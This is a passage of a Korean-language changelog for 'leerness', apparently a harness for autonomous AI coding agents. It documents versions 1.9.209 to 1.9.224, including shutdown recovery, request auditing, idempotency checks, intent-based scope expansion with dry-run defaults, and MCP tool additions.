### 2. handoff 본문 자동 노출
- delivered 후보 ≥ 1건 시: `## 📥 사용자 요청 자동 완료 가능 (1.9.224, N건)` 본문 섹션
- top 5 후보 노출 (overflow는 `... +N건 더`)
- 자동 권장: `→ leerness requests auto-complete --apply`
- 1.9.222 비정상 종료 본문 다음, 활성 룰 이전 위치

### 3. `session close --auto-apply-delivered` 플래그
- 마감 시 delivered 후보 자동 완료 (안전: 패턴 매칭 + 버전 가드)
- `autoCompleteReason: 'session-close-auto-apply-1.9.224'` 추적
- 플래그 없으면 기존 동작 (안내만)

### 4. 누적 회귀 (1.9.207~223) — 모두 유지

### 5. stress-v169 — 16/16 PASS
- 1.9.224 (7): VERSION + MCP 61 + 실 호출 + handoff 본문 + 본문 미노출 + session close auto-apply + 기본 보존
- 성능 (2): cold_start avg 556ms / MCP 61 tools/list 417ms
- 누적 회귀 (7): 1.9.207~223

### 6. 자동 release (86 라운드 main-push streak · 47 라운드 npm publish streak)

🔌 **사용자 요청 자동 완료 시스템 완성** (3 라운드 누적):
- 1.9.223 CLI auto-complete
- 1.9.224 MCP 61 + handoff 본문 + session close 자동 적용

---

## 1.9.223 — 2026-05-22

**📥 사용자 요청 auto-complete (delivered 패턴 자동 감지) + handoff/session close 통합.**

### 1. `leerness requests auto-complete` — delivered 패턴 자동 정리
- 1.9.207 시스템 운영 중 누적된 "Round X.Y.Z — 구현 완료" 패턴의 자기-기록 요청을 자동 감지
- 정규식: `(Round\s+)?\d+\.\d+\.\d+` + `(구현 완료|implemented|delivered|shipped|배포 완료)`
- 현재 package.json 버전 이하만 후보 (미래 버전 무시) — 안전 가드
- 기본 dry-run (목록만), `--apply` 명시 시에만 실제 상태 변경
- 상태 변경 시 `autoCompletedAt` + `autoCompleteReason: 'delivered-pattern-1.9.223'` 추적 기록

### 2. handoff 헤드라인 자동 노출
- delivered 후보 ≥ 1건 시: `📥 자동완료가능 N건 (1.9.223)` — 미답 요청 신호 대신 우선 노출
- 운영 중 누적된 가짜 미답 신호 (실제는 모두 처리됨) 자동 정리 권장

### 3. handoff/session close JSON 5번째 통합 필드 — `deliveredRequests`
- `{ candidates, currentVersion, autoCompleteAvailable, ids[] }`
- 1.9.218 4 필드 (userRequests/preWake/idempotency/abnormalShutdown) → **5 필드 완성**
- 외부 모니터링/CI 자동 감지

### 4. session close 자동 통합 본문 노출
- 1.9.207/209/212/220 통합 패턴에 1.9.223 추가
- delivered 후보 시: `📥 delivered 패턴 N건 (1.9.223) — 자동 완료 가능`
- `→ leerness requests auto-complete --apply` 가이드 자동

### 5. 실 운영 검증 — 누적 8건 정리 완료
- UR-0004~UR-0011 (1.9.208~213 라운드 자기-기록) — 모두 수동 정리 완료
- 1.9.223 시스템은 향후 재발 시 1줄 명령으로 즉시 정리

### 6. 누적 회귀 (1.9.207~222) — 모두 유지

### 7. stress-v168 — 15/15 PASS
- 1.9.223 (6): VERSION + 자동 감지 + --apply + dry-run + handoff JSON + session close JSON
- 성능 (2): cold_start avg 401ms / auto-complete 432ms
- 누적 회귀 (7): 1.9.207~222

### 8. 자동 release (85 라운드 main-push streak · 46 라운드 npm publish streak)

📥 **사용자 요청 라이프사이클 완성**: 1.9.207 (수동 audit) → 1.9.217 (마감 자동) → **1.9.223 (자동 완료)** — 3 라운드 누적

---

## 1.9.222 — 2026-05-22

**🛡 session-resume --auto-fix 안전 회복 + handoff 본문 비정상 종료 자동 노출.**

### 1. `leerness session-resume --auto-fix` — 안전한 자동 회복
- 1.9.220 detect / 1.9.221 MCP / 1.9.222 **auto-fix**
- `wakeup-missed` 신호 감지 시 → 30분+ 지난 pending wakeup 자동 `superseded`
- `state.supersededReason: 'auto-fix-1.9.222-abnormal-shutdown'`
- 사용자/AI가 수동 정리할 필요 없이 다음 wakeup이 정상 동작
- `--auto-fix` 옵션이 없으면 기존 동작 그대로 (감지만, 변경 X)

### 2. handoff 본문 자동 노출 — 비정상 종료 섹션
- 1.9.220 헤드라인 (`🔌 비정상종료 <severity>`) + 1.9.222 **본문**
- `severity: high` → `## 🚨 비정상 종료 감지 (1.9.220, severity: high)` 본문 섹션 자동
- `severity: medium` → `## ⚠ 비정상 종료 감지` 본문 섹션 자동
- 본문 출력 위치: pre-wake-audit 섹션 다음, 활성 룰 이전
- top 3 신호 + 재개 가이드 + auto-fix 가이드 한 번에 노출

### 3. CLAUDE.md / AGENTS.md 1.9.214~221 운영 강화 8 라운드 통합
- drift 차단을 위한 `## 운영 강화 8 라운드 (1.9.214~221)` 섹션 누적
- 9 라운드 (drift 차단 / handoff 헤드라인 / MCP 5종 / session close / handoff JSON 4 통합 / 80 라운드 / 비정상 종료 / MCP 60 / auto-fix) 모두 단일 시야 노출

### 4. 누적 회귀 (1.9.207~221) — 모두 유지

### 5. stress-v167 — 14/14 PASS
- 1.9.222 (6): VERSION + auto-fix (격리) + auto-fix 미지정 시 동작 + handoff 본문 노출 + handoff 정상 시 미노출 + CLAUDE 8 라운드 섹션
- 성능 (2): cold_start avg 408ms / MCP 60 도구 413ms
- 누적 회귀 (6): 1.9.207~221

### 6. 자동 release (84 라운드 main-push streak · 45 라운드 npm publish streak)

🛡 **비정상 종료 시스템 완성**: 1.9.220 detect → 1.9.221 MCP → 1.9.222 **auto-fix** + **본문 자동 노출** (3 라운드 누적)

---

## 1.9.221 — 2026-05-22

**🎉 MCP 60 도구 마일스톤 + abnormalShutdown JSON 통합 (handoff/session close).**

### 1. MCP 60번째 도구 — `leerness_session_resume`
- 1.9.220 비정상 종료 감지 시스템을 외부 AI에 노출
- 인자: `{ path? }`
- 응답: `{ abnormalShutdown, severity, signals[], resumeGuide[] }`
- 5신호 분석 (last-handoff/wakeup-missed/in-progress-stale/auto-resume-plan/release-branch)

### 2. handoff --json `abnormalShutdown` 필드 추가
- `{ detected, severity, signalCount, signals[], resumeGuide[] }`
- 외부 모니터링 도구 / CI 가 비정상 종료 자동 감지
- 1.9.218 통합 패턴 확장 (handoff JSON 4종 필드 완성: userRequests/preWake/idempotency/abnormalShutdown)

### 3. session close --json 동일 통합
- 마감 시 다음 라운드 진입 시 재개 가이드 자동 회수
- CI 마감 후 비정상 종료 detect 가능

### 4. 누적 회귀 (1.9.207~220) — 모두 유지

### 5. stress-v166 — 16/16 PASS
- 1.9.221 (4): VERSION + MCP 60 + session_resume 등록 + 실 호출 (high severity 응답)
- abnormalShutdown JSON 통합 (3): handoff/session close + wakeup miss 시나리오
- 성능 (2): cold_start 374ms / MCP 60 도구 385ms
- 누적 회귀 (7): 1.9.207~220

### 6. 자동 release (83 라운드 main-push streak · 44 라운드 npm publish streak)

🎉 **MCP 60 도구 도달** (53 → 60, +7: 1.9.168 +3 / 1.9.216 +5 / 1.9.221 +1)
🎉 **handoff/session close JSON 4 통합 필드 완성** (userRequests/preWake/idempotency/abnormalShutdown)

---

## 1.9.220 — 2026-05-22

**🔌 비정상 종료 후 자율 재개 시스템 (사용자 명시).**

### 사용자 명시
> *"자율모드일때 절전모드였거나, 시스템종료나 AI에이전트 세션종료등으로 자율개발모드가 비정상적으로 종료되었다가 다시 실행하여 세션을 이어갈때, 감지하고 작업이 중단된지점이나 누락된작업을 감지하고 개발을이어가거나 자율모드를 다시 진행"*

### 1. `_detectAbnormalShutdown(root)` — 5신호 종합 감지
| # | 신호 | 트리거 | severity |
|---|---|---|---|
| 1 | `last-handoff-stale` | gap > 60min (정상 25min 대비) | gap > 240min: high / else medium |
| 2 | `wakeup-missed` | active-wakeups pending → 30min+ 지남 | gap > 120min: high |
| 3 | `in-progress-stale` | in-progress task + progress-tracker 24h+ stale | high |
| 4 | `auto-resume-plan-unused` | auto-resume-plan 60min+ 미사용 | ageMin > 240: medium |
| 5 | `release-branch-pending` | 2+ release/* branch (sync-main 누락) | low |

### 2. `leerness session-resume` CLI
- 비정상 종료 감지 + 5신호 분석
- 자동 재개 가이드 출력 (7단계)
- `--json` 옵션 (외부 자동화)

### 3. handoff 헤드라인 16번째 요소
- 비정상 종료 감지 시: `🔌 비정상종료 <severity> (N신호)`
- 헤드라인 라벨: `1.9.81/93/113/152/162/192/197/204/207/209/215/220`

### 4. 재개 가이드 7단계 (자동 생성)
신호별 맞춤 가이드:
1. `leerness handoff .` — 현재 상태 종합
2. `leerness resume` — auto-resume-plan 적용 (auto-resume-plan-unused 시)
3. `leerness task list --status in-progress` — stale task 검토 (in-progress-stale 시)
4. ScheduleWakeup 재등록 (wakeup-missed 시)
5. `git branch -a` → `leerness release sync-main` (release-branch-pending 시)
6. `leerness pre-wake-audit` — 누락 작업 / 충돌 점검
7. `leerness requests audit` — 미답 사용자 요청 확인

### 5. 실 검증 시나리오
- **정상 워크스페이스** → `abnormalShutdown: false / severity: none`
- **wakeup 2024분 지남** (시뮬레이션) → `severity: high / wakeup-missed 1신호 + 가이드 4단계 자동 생성`

### 6. 누적 회귀 (1.9.207~219) — 모두 유지

### 7. stress-v165 — 18/18 PASS
- 1.9.220 (7): VERSION + 5신호 등록 + 정상/비정상 시나리오 + handoff 통합 + CLI 라우팅
- 성능 (2): cold_start 461ms / MCP 59 도구 424ms
- 누적 회귀 (9): 1.9.207~219

### 8. 자동 release (82 라운드 main-push streak · 43 라운드 npm publish streak)

🎉 **자율 모드 복원력 강화** — 절전/종료/세션종료 무관, 재시작 시 자동 진단 + 재개 가능

---

## 1.9.219 — 2026-05-22

**🎉 80 라운드 자율 모드 마일스톤 + session-workflow.md 통합 갱신.**

### 1. 80 라운드 마일스톤 보고서
- `_reports/milestone-1.9.219-80-rounds.md` (private, npm 제외)
- 1.9.140 main 자동 push streak 시작 이후 **80 라운드 정확 도달**
- Phase 1~5 단계별 요약 (자동화 인프라 → 자율 마일스톤 → 5축 완성 → 사용자 명시 소진 → 운영 강화)
- 5축 매트릭스 100/100 달성 기록 (1.9.218)
- 사용자 명시 7 라운드 (1.9.207~213) 완전 소진 표

### 2. session-workflow.md 통합 갱신 (drift 차단)
- `(1.9.217+) session close 자동 호출 3종 결과 확인` 체크리스트 추가
- `## 사용자 명시 요청 처리 (1.9.207~213)` 신설 섹션 — 5단계 순서:
  1. `leerness requests add` (1.9.207)
  2. `leerness review-request` (1.9.176)
  3. `leerness intent classify` (1.9.213, opt-in)
  4. `leerness constraints check` (1.9.208)
  5. `leerness task add` (자동 dedup + auto review trigger)
- `## adaptive wakeup interval (1.9.210)` 신설 — opt-out 가이드

### 3. 누적 회귀 (1.9.207~218) — 모두 유지

### 4. stress-v164 — 15/15 PASS
- 1.9.219 (3): VERSION + 마일스톤 보고서 + session-workflow 통합 검증
- 성능 (2): cold_start 618ms / MCP 59 도구 501ms
- 누적 회귀 (10): 1.9.207~218 전체

### 5. 자동 release (81 라운드 main-push streak · 42 라운드 npm publish streak)

🎉 **80 라운드 자율 모드 마일스톤** + 5축 100/100 + 백로그 0 + MCP 59 도구

---

## 1.9.218 — 2026-05-22

**🔁 handoff --json 통합 강화 + 5축 매트릭스 보강 (98→100 후보).**

### 1. handoff --json 통합 필드 추가 (session close 와 동일 패턴)
| 필드 | 출처 | 내용 |
|---|---|---|
| `userRequestsAudit` | 1.9.207 | total/open/missing/tracked/stale |
| `preWakeAudit` | 1.9.209 | auditedAt/ageMin/critical/warning/needsAttention (보고서 있을 때만) |
| `idempotencyAudit` | 1.9.212 | violations/high/medium/low/verified/overall |

### 2. JSON 일관성 확보 — handoff / session close / health / drift check 4종 모두 통합
- 외부 자동화 도구 / CI 가 4 JSON 명령으로 종합 회수 가능
- 1.9.207~213 신규 기능이 모든 주요 JSON 출력에 노출

### 3. 5축 매트릭스 보강 (98 → 100 후보)
1.9.207~217 11 라운드 누적 영향:
- **A축 (범용 AI 하네스)** 9.5→10: 1.9.208 constraints (6 플랫폼 catalog) + 1.9.213 intent (5 도메인)
- **B축 (멀티 Sub-Agent)** 9.5→10: 1.9.209 pre-wake audit + 1.9.216 MCP 5종 (59 도구)
- **C축 (공식 스킬)** 10/10 유지
- **D축 (장기 맥락)** 9.5→10: 1.9.211 .harness→.leerness AI 참조 가이드
- **E축 (게으름 방지)** 9.5→10: 1.9.207 미답 요청 + 1.9.212 멱등성 + 1.9.217 session close 통합

→ **100/100 (5축 평균 10/10)**

### 4. 누적 회귀 (1.9.207~217) — 모두 유지

### 5. stress-v163 — 16/16 PASS
- 1.9.218 (5): VERSION + JSON 통합 3종 필드 검증
- userRequestsAudit total=1 검증, idempotency overall=clean 검증
- pre-wake-audit 자동 통합 검증
- 성능 (2): cold_start 450ms / MCP 59 도구 417ms
- 누적 회귀 (9)

### 6. 자동 release (80 라운드 main-push streak · 41 라운드 npm publish streak)

🎉 **5축 매트릭스 100/100 도달**

---

## 1.9.217 — 2026-05-22

**🔚 session close 자동 통합 — 1.9.207/209/212 자동 호출.**

### 1. session close 자동 호출 3종 (마감 시)
| 영역 | 출처 | 동작 |
|---|---|---|
| `userRequestsAudit` | 1.9.207 | open/in-progress 요청 → missing/tracked/stale 분류 |
| `preWakeAudit` | 1.9.209 | sleep 전 6 영역 audit + .harness/pre-wake-report.json 자동 저장 |
| `idempotencyAudit` | 1.9.212 | 4영역 멱등성 검사 (rule/task/user-requests/wakeups) |

### 2. JSON 모드 (`--json`) 통합 필드 추가
- `userRequestsAudit: { total, open, missing, tracked, stale }`
- `preWakeAudit: { auditedAt, critical, warning, info, needsAttention }`
- `idempotencyAudit: { violations, high, medium, low, verified, overall }`

### 3. human 출력 자동 섹션
```
## 🔚 session close 자동 통합 보고 (1.9.217)
  ⚠ 미답 사용자 요청 N건 (task-log/plan/decisions 매칭 안 됨)
  🚨 pre-wake-audit: critical N (다음 깨어남 시 점검 필요)
  ✓ 멱등성 검사 통과 — verified 4 영역
```

### 4. opt-out 옵션
- `--no-pre-wake` — pre-wake audit 스킵
- 옵션 외 다른 통합은 항상 실행 (가벼움)

### 5. 누적 회귀 (1.9.207~216) — 모두 유지

### 6. stress-v162 — 18/18 PASS
- 1.9.217 (7): VERSION + JSON 필드 + human 섹션 + 자동 저장 + opt-out + 필드 구조 + clean
- 성능 (2): cold_start 489ms / MCP 59 도구 785ms
- 누적 회귀 (9)

### 7. 자동 release (79 라운드 main-push streak · 40 라운드 npm publish streak)

🎉 **session close 강화** — 매 마감 시 운영 안전 자동 점검

---

## 1.9.216 — 2026-05-22

**🔌 MCP 5종 추가 — 1.9.207~213 외부 AI 노출 (54 → 59 도구).**

> 백로그 소진 후 외부 AI 통합 가치 강화 — Claude/Codex/Gemini 등이 신규 7 라운드 기능을 직접 호출 가능

### 1. MCP 신규 5종 (1.9.216 라벨)
| 도구 | 출처 | 인자 |
|---|---|---|
| `leerness_requests_audit` | 1.9.207 | `{ path? }` → missing/tracked/stale 회수 |
| `leerness_constraints_check` | 1.9.208 | `{ request, path? }` → 플랫폼 alias 매칭 |
| `leerness_pre_wake_audit` | 1.9.209 | `{ path? }` → 6영역 audit |
| `leerness_intent_classify` | 1.9.213 | `{ request, path? }` → intent + 도메인 + dry-run 확장 |
| `leerness_idempotency_audit` | 1.9.212 | `{ path? }` → 4영역 멱등성 검사 |

### 2. 5축 매트릭스 B축 (멀티 Sub-Agent) 가치 강화
- 외부 AI 가 leerness 의 7 라운드 신규 기능을 MCP 로 직접 호출
- Claude Desktop / Cursor / Codex CLI 등에서 leerness MCP server 등록 → 즉시 사용 가능
- "사용자가 했던 요청 중 누락된 게 있나?" "이 기능 구현 전 어떤 API 규정?" "이 요청은 정확히 그것만 / 포괄적?" 등을 외부 AI가 회수

### 3. 누적 회귀 (1.9.207~215) — 모두 유지

### 4. stress-v161 — 19/19 PASS
- 1.9.216 (8): VERSION + tools/list 59개 + 5종 등록 + 4종 실 호출 검증
- leerness_intent_classify("맵+캐릭터+게임 기능") → broad/game/8 candidates ✓
- leerness_constraints_check("Stripe API") → stripe matched ✓
- leerness_pre_wake_audit → audited 0 ✓
- leerness_idempotency_audit → clean ✓
- leerness_requests_audit → total=0 ✓
- 성능 (2): cold_start 544ms / MCP 59도구 541ms
- 누적 회귀 (9): 1.9.207~215

### 5. 자동 release (78 라운드 main-push streak · 39 라운드 npm publish streak)

🎉 **MCP 58 도구 마일스톤** (이전 53 → 59, +6 in 1.9.158/159/168/216)

---

## 1.9.215 — 2026-05-22

**🎯 handoff 헤드라인에 constraints/intent 자동 통합 + AGENTS.md 7 라운드 누적.**

> 백로그 소진 후 운영 가치 강화 — 현재 진행 중 task에서 자동으로 플랫폼 제약 + 의도 분류 노출

### 1. handoff 헤드라인 15번째 요소 (1.9.215)
- progress-tracker.md 의 **첫 활성 task** request 자동 추출
- **1.9.208 constraints 통합**: 플랫폼 alias 매칭 시 `🚦 N 플랫폼 제약` 노출
  - 예: "Stripe API 결제 모듈" → `🚦 1 플랫폼 제약`
- **1.9.213 intent 통합**: 의도 자동 분류 시 `🎯 intent broad/<domain>` 또는 `🎯 intent precise` 노출
  - 예: "게임 만들어줘 ... 포괄적" → `🎯 intent broad/game`
- 헤드라인 라벨: `1.9.81/93/113/152/162/192/197/204/207/209/215`
- done/dropped/blocked/completed task는 무시 (활성만 분석)

### 2. AGENTS.md 7 라운드 누적 갱신 (CLAUDE.md 등가)
- `## 사용자 명시 신규 7종 (1.9.207~213)` 표 형식 (버전 / 기능 / CLI)
- `### handoff 헤드라인 자동 노출 (1.9.215+)` 섹션
- `### 의도 보호 원칙 (1.9.213)` 명시

### 3. 누적 회귀 (1.9.207~214) — 모두 유지

### 4. stress-v160 — 17/17 PASS
- 1.9.215 (6): VERSION + 헤드라인 코드 + AGENTS.md + 격리 검증 3종
- stripe task → 🚦 자동 / broad+game task → 🎯 자동 / done task 무시
- 성능 (2) + 누적 회귀 (9)
- 성능: --version cold start avg 677ms · MCP 54 도구 453ms

### 5. 자동 release (77 라운드 main-push streak · 38 라운드 npm publish streak)

---

## 1.9.214 — 2026-05-22

**🛠 운영 안정화 라운드 — drift 차단 + AGENTS/CLAUDE 7 라운드 누적 갱신 + 종합 회귀.**

> **백로그 소진 후 운영 강화** — 1.9.207~213 7 라운드의 신규 기능을 AI/문서 인지도에 통합, drift warning 해소

### 1. CLAUDE.md 7 라운드 누적 통합 (drift 차단)
- `## 사용자 명시 신규 7종 (1.9.207~213)` 섹션 신설
- 각 버전별 CLI + 핵심 기능 요약 (3~5 라인)
- AI 에이전트가 1.9.207~213 신규 기능을 즉시 인지

### 2. stress-v159 — **15/15 PASS** (1.9.207~213 7 라운드 통합 회귀)
- 1.9.214 운영 (2)
- 1.9.207 requests 라이프사이클 (1) — add/audit/list/complete/drop
- 1.9.208 constraints (2) — stripe/openai 매칭 + review-request 통합
- 1.9.209 pre-wake-audit (1) — 실행 + --last 저장 검증
- 1.9.210 wakeup-interval (1) — adaptive ↔ override ↔ auto 토글
- 1.9.211 workspace-dir (1) — dry-run + migrate + auto-detect
- 1.9.212 idempotency (1) — rule/task dedup + audit clean
- 1.9.213 intent (2) — game 확장 + precise 의도 보호
- 성능 (2) + handoff (1) + release (1)

### 3. 누적 회귀 (1.9.200~213) — 모두 유지

### 4. 자동 release (76 라운드 main-push streak · 37 라운드 npm publish streak)

### 5. 핸드오프 (백로그 status)
- 사용자 명시 task 백로그 **0건 pending** (#298, #302~307 모두 completed)
- 다음 라운드: 새 사용자 요청 대기 또는 마일스톤 1.9.220 후보 준비

---

## 1.9.213 — 2026-05-22

**🎯 intent inference + scope expansion 게이트 (사용자 명시) — 마지막 pending task 완성.**

### 사용자 명시
> *"사용자가 말한 내용만 수정해야하는 경우도 있지만, 관련있는것이나 보강하면 좋을 부분을 파악하여 진행 / 게임 개발에서 맵+캐릭터+기본기능 요청 시 의도 파악"*

### 1. 3원칙 안전 설계
1. **Always-Off, Opt-In** — 기본 비활성, 명시적 호출 (`leerness intent expand`) 또는 review-request 통합 시만 작동
2. **Dry-run 기본** — 실제 task add **절대 X**, 모든 출력은 후보 보고만
3. **명시 vs 추론 분리 라벨링** — `👤 사용자 명시` vs `🤖 AI 추론 확장` 항상 구분

### 2. `_classifyIntent(text)` — 3단계 분류
- **precise** ("정확히", "그것만", "그대로", "말한대로", "only") → AI 추론 확장 **비활성**
- **broad** ("기본", "포괄적", "등등", "다양한", "전체", "필요한") → 확장 후보 N건 dry-run 제시
- **default** (명시 없음) → 명시 우선, 확장 후보 검토용으로 표시

### 3. `.harness/domain-catalog.json` — 5 default + user 편집 가능
- **game** (10 컴포넌트): map, character, gameLoop, collision, camera, hud, audio, save, menu, input
- **web** (8 컴포넌트): routing, state, auth, api, db, ui, test, deploy
- **api** (7 컴포넌트): endpoint, auth, rate-limit, validation, error, logging, docs
- **cli** (6 컴포넌트): argParser, help, config, output, error, completion
- **data** (6 컴포넌트): ingest, transform, storage, query, validation, lineage

### 4. `_inferScopeExpansion(text, root)` — 확장 후보 dry-run
- 도메인 자동 탐지 (alias 매칭)
- 사용자 명시 mention 추출
- 나머지 → AI 추론 확장 후보
- **mode: 'dry-run' 강제** (실행 X)

### 5. `leerness intent <classify|expand|domains>` CLI
- `classify "<req>"` — 의도 분류 + 신호
- `expand "<req>"` — 도메인 탐지 + 확장 후보 dry-run
- `domains` — catalog 출력
- 모두 `--json` 지원

### 6. 사용자 게임 예시 검증
```
$ leerness intent expand "맵과 캐릭터 + 기본 게임 기능 포괄적으로 만들어줘"
🌐 intent: broad  📦 domain: game (matched: "게임")

## 👤 사용자 명시 (2)
  • character — 캐릭터/스프라이트 + 애니메이션 상태머신
  • gameLoop — 게임 루프 (tick/render/update)

## 🤖 AI 추론 확장 후보 (8, dry-run)
  [1] map / [2] collision / [3] camera / [4] hud / [5] audio / [6] save / [7] menu / [8] input

→ 진행 시 명시 승인 필요: leerness task add "<선택한 후보 요청>"
→ 전부 무시하려면 추가 task add 없이 명시 요청만 진행
```

### 7. precise 의도 보호 검증
```
$ leerness intent expand "정확히 게임의 맵만 수정해줘 그것만"
🛡 intent: precise — AI 추론 확장 비활성 (사용자 의도 보호)
```

### 8. 누적 회귀 (1.9.200~212) — 모두 유지

### 9. stress-v158 — 19/19 PASS
- 1.9.213 (10) + 성능 (2) + 누적 회귀 (7)
- 게임 예시 broad → 8 확장 후보 / precise → 0 확장 (의도 보호) / web 도메인 탐지
- 성능: --version cold start avg 388ms · MCP 54 도구 434ms

### 10. 자동 release (75 라운드 main-push streak · 36 라운드 npm publish streak)

### 11. 🎉 사용자 명시 task 백로그 **완전 소진** (#307까지 모두 completed)
- 1.9.207~213 7 라운드 연속 사용자 명시 요청 처리:
  - 207 user-requests audit / 208 platform constraints / 209 pre-wake audit
  - 210 adaptive wakeup / 211 .harness→.leerness migration / 212 idempotency dedup
  - 213 intent inference + scope expansion 게이트

---

## 1.9.212 — 2026-05-22

**🔁 멱등성 감사 + ruleAdd/taskAdd dedup 보강 (사용자 명시).**

### 사용자 명시
> *"다양한 부분에서 멱등성이 필요한 부분이 고려되고있는지 확인해주고 올바른 방향인지 판단해줘"*

### 1. ruleAdd dedup (line 10229+)
- 같은 description + trigger + active 룰 이미 존재 시 skip
- `--force` 플래그로 우회 가능
- 출력: `rule exists (skip): R-XXXX [trigger] description (--force 로 덮어쓰기)`

### 2. taskAdd dedup (line 3709+)
- progress-tracker.md 의 markdown table 파싱 (`| T-XXXX | status | request | … |`)
- 같은 request 텍스트 + 활성 상태(`requested`/`in-progress`) 이미 존재 시 skip
- `--force` 플래그로 우회 가능

### 3. `_runIdempotencyAudit(root)` — 4영역 점검
- **rules**: 같은 description + trigger + active 중복 (severity: medium)
- **tasks**: 같은 request 텍스트 + 활성 상태 중복 (severity: medium)
- **user-requests**: 1.9.207 자체 dedup 검증 (severity: low)
- **wakeups**: 1.9.205 동일 expectedFireAt 검증 (severity: high)

### 4. `leerness idempotency audit` CLI
- 위반 분류 (high/medium/low)
- 영역별 verified / violations 보고
- `--json` 옵션

### 5. 누적 회귀 (1.9.200~211) — 모두 유지

### 6. stress-v157 — 17/17 PASS
- 1.9.212 (8) + 성능 (2) + 누적 회귀 (7)
- 격리 tmp dir에서 ruleAdd 2회 → 1건만 등록 검증
- `--force` 우회 검증
- 수동 중복 rule 삽입 → audit이 정확히 1건 violation 탐지

### 7. 자동 release (74 라운드 main-push streak · 35 라운드 npm publish streak)

---

## 1.9.211 — 2026-05-22

**📂 `.harness` → `.leerness` opt-in 마이그레이션 + AI 참조 가이드 (사용자 명시).**

### 사용자 명시
> *"leerness설치시 생성되는 .harness를 .leerness으로 변경할 수 있을까 / 기존 버전에서도 마이그레이션시 AI가 참조할 수 있기도하면 어떨까"*

### 1. workspace-dir 헬퍼 (default-safe opt-in)
- `_workspaceDirName(root)` — env `LEERNESS_WORKSPACE_DIR` > `.leerness/MIGRATED_FROM_HARNESS` 마커 > default `.harness`
- `_workspaceDirAbs(root)` — 절대 경로
- 기본 동작: **`.harness` 유지** (226+ path reference 안정) — breaking change 0

### 2. 마이그레이션 시스템
- `_migrateWorkspaceDir(root, opts)` — `.harness` 전체 재귀 copy → `.leerness`
  · `--dry-run` 지원
  · `--force` (기존 dst 덮어쓰기)
  · skip / errors / copiedFiles 분류 보고
- 마이그레이션 결과물:
  · `.leerness/MIGRATED_FROM_HARNESS` 마커
  · `.leerness/WHERE_TO_FIND.md` AI 참조 가이드 (자동 생성)
  · `.harness/MIGRATED_TO_LEERNESS.md` redirect 안내 (backward compat 유지)

### 3. AI 참조 가이드 (`_buildWorkspaceReferenceGuide`)
- 디렉토리 구조 시각화 (핵심 파일 25개)
- "자주 묻는 위치" 매핑 표 (현재 task / 영구 룰 / pre-wake / 미답 요청 / 다음 라운드 plan / API 제약 / wakeup 권장)
- 마이그레이션 안내 (3가지 상태 분기)
- 1.9.207~210 신규 메타파일 위치 명시

### 4. `leerness workspace-dir <get|guide>` CLI
- `get` — 현재 디렉토리 + .harness/.leerness 존재 여부 + 마이그레이션 상태
- `guide` — AI 참조 가이드 출력

### 5. `leerness migrate-workspace-dir` CLI
- `--dry-run` / `--force` 지원
- copied / skipped / errors 분류
- 자동 마커 + 가이드 + redirect 생성

### 6. 누적 회귀 (1.9.200~210) — 모두 유지

### 7. stress-v156 — 19/19 PASS
- 1.9.211 (10) + 성능 (2) + 누적 회귀 (7)
- 격리 tmp dir 전체 사이클 (default → dry-run → migrate → auto-detect → env override)
- AI 가이드 키 섹션 검증
- 성능: --version cold start avg 452ms · MCP 54 도구 445ms

### 8. 자동 release (73 라운드 main-push streak · 34 라운드 npm publish streak)

### 9. 후속 라운드 로드맵
- 이번 라운드는 **opt-in 헬퍼 + CLI**만 추가 (breaking change 0)
- 후속에서 226+ path reference 를 `_workspaceDirAbs(root)` 로 점진 전환

---

## 1.9.210 — 2026-05-22

**⚡ adaptive wakeup interval — 사용자 활동 기반 자동 조절 (사용자 명시).**

### 사용자 명시
> *"wakeup 30분등 긴 시간이 필요없다면 간격을 타이트하게 자동으로 조절하도록"*

### 1. `.harness/wakeup-history.json` — fire 이력 누적
- `_wakeupHistoryPath / _loadWakeupHistory / _writeWakeupHistory` — 파일 I/O
- `_recordWakeupFire(root, kind)` — kind: 'auto' / 'user-trigger' / 'wakeup-miss'
- 최근 50개 rotate

### 2. `_computeAdaptiveInterval(root)` — 활동량 기반 권장 interval
- 범위: **600s (10min) ~ 2700s (45min)**, default 1500s
- 분석 차원:
  - 최근 2시간 user-trigger 빈도 (3+ → 15min, 0 → 35min)
  - 최근 5건 user-trigger 평균 gap (avg < 20min → 단축)
  - pre-wake critical 신호 (1.9.209 통합) → 20min 단축
- opt-out:
  - env `LEERNESS_FIXED_INTERVAL=1500`
  - `leerness wakeup-interval set 900` (override)

### 3. `leerness wakeup-interval <get|set|auto|history|record>` CLI
- `get` — 권장 interval + stats (--json)
- `set <secs>` — override 설정
- `auto` — override 해제 + 자동 계산 복귀
- `history` — 최근 fire 이력 (--json)
- `record <kind>` — fire 기록 (테스트/외부 통합용)

### 4. 자동 단축 시나리오 검증
- 신규 워크스페이스 idle → **35min**
- user-trigger 3회/2h → **10min** (1500 → 600)
- pre-wake critical + 활동 보통 → **20min**

### 5. 누적 회귀 (1.9.200~209) — 모두 유지

### 6. stress-v155 — 18/18 PASS
- 1.9.210 (9) + 성능 (2) + 누적 회귀 (7)
- 격리 tmp dir 라이프사이클 + override 토글 + rotate to 50
- 성능: --version cold start avg 440ms · MCP 54 도구 421ms

### 7. 자동 release (72 라운드 main-push streak · 33 라운드 npm publish streak)

---

## 1.9.209 — 2026-05-22

**🔍 pre-wake sub-agent audit + 깨어남 직후 자동 노출 (사용자 명시).**

### 사용자 명시
> *"메인 에이전트가 슬립전에 서브에이전트를 호출해서 미비된 부분이 있는지, 충돌나는 부분이 있는지, 이전에 누락된 작업이 있는지 등등 여러부분을 탐색하면서 필요한 내용을 정리하고 메인 에이전트가 깨어났을때, 서브에이전트가 정리한 내용을 확인해보거나 하는 기능"*

### 1. `.harness/pre-wake-report.json` — sleep 전 audit 누적
- `_preWakeReportPath/_loadPreWakeReport/_writePreWakeReport` 파일 I/O 헬퍼
- 최근 10개만 유지 (rotate)
- 구조: `{ auditedAt, auditVersion, findings: {critical/warning/info}, summary }`

### 2. `_runPreWakeAudit(root)` — sub-agent audit 6영역
- **missing-user-requests** (1.9.207 통합) — task-log/plan/decisions 매칭 안 된 요청
- **stale-user-requests** — 7일+ open 요청
- **stale-in-progress** — 24h+ 진척 없는 task
- **drift-handoff-stale** — session-handoff.md 5일+ stale
- **wakeup-missed** — wakeup miss 감지 (1.9.205)
- **next-action-pending** — next-action queue 대기
- **auto-resume-plan-ready/stale** — 1.9.203 plan 상태

### 3. `leerness pre-wake-audit` CLI
- 기본: 새 audit 실행 + 저장
- `--last` / `show` / `review` — 가장 최근 저장된 audit 표시
- `--json` — JSON 출력

### 4. handoff 자동 노출 (사용자 명시 "깨어났을때 확인")
